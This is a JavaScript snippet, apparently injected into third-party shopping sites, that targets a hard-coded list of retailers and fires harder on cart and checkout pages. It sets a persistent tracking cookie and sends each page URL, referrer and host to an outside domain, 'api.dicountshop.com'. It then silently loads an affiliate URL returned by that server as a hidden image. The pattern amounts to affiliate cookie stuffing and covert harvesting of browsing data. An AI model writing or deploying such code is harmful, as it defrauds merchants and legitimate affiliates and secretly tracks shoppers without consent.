(function () {
    
    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
            var r = Math.random() * 16 | 0,
                v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    
    function getCookie(cname) {
        var name = cname + '=';
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i].trim();
            if (c.indexOf(name) === 0) return c.substring(name.length, c.length);
        }
        return '';
    }

   
function fireTracking(url) {
    
    try {
    
        var img = new Image();
        img.src = url;
        img.style.display = 'none';
        document.body.appendChild(img);
        console.log("Tracking Fired: ", url);
    } catch (e) {
        console.error("Tracking error:", e);
    }
}

   
    async function initTracking() {
       
        if (sessionStorage.getItem('tracking_done_' + window.location.hostname)) {
             
             if (!isCartPage()) return;
        }

        try {
            let uniqueId = getCookie('tracking_uuid') || generateUUID();
            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;SameSite=Lax';
            
            let response = await fetch('https://api.dicountshop.com/api/track-user', {
                method: 'POST',
                keepalive: true, 
                body: JSON.stringify({
                    url: window.location.href,
                    referrer: document.referrer,
                    unique_id: uniqueId,
                    origin: window.location.hostname,
                    timestamp: new Date().getTime()
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            
            let result = await response.json();
            
            if (result.success && result.affiliate_url) {
               
                fireTracking(result.affiliate_url);
                 sessionStorage.setItem('tracking_done_' + window.location.hostname, 'true');
            } else {
                
                fireTracking('https://api.dicountshop.com/api/fallback-pixel?id=' + uniqueId);
            }
        } catch (error) {
            console.error('Tracking Failed:', error);
        }
    }

    function isCartPage() {
        const cartPatterns = ["cart", "checkout", "pay", "shipping", "review-order"];
        return cartPatterns.some(path => window.location.pathname.toLowerCase().includes(path));
    }

    
  
    function run() {
        const host = window.location.hostname;
        console.log("host",host)
        
        const config = {
            "www.fareastflora.com": { always: true, cartExtra: true },
            "www.ofm.co.th": { always: false, cartExtra: true },
            "checkout.accorplus.com": { always: true, cartExtra: false },
            "www.studio7thailand.com": { always: false, cartExtra: true },
            "www.bnn.in.th": { always: false, cartExtra: true },
            "gfiberprepaid.globe.com.ph": { always: true, cartExtra: false },
            "shop.globe.com.ph": { always: true, cartExtra: false },
            "www.watsons.com.hk": { always: false, cartExtra: true },
            "compasia.sg": { always: true, cartExtra: true },
             "internationalopenacademy.com": { always: true, cartExtra: true },
             "www.xcite.com": { always: false, cartExtra: true },
            "www.fairprice.com.sg": { always: true, cartExtra: true }
        };

        const site = config[host];
        if (site) {
            if (site.always) initTracking();
            if (site.cartExtra && isCartPage()) {
                
                setTimeout(initTracking, 1500);
            }
        }
    }

    if (document.readyState === "interactive" || document.readyState === "complete") {
        run();
    } else {
        window.addEventListener("DOMContentLoaded", run);
    }
})();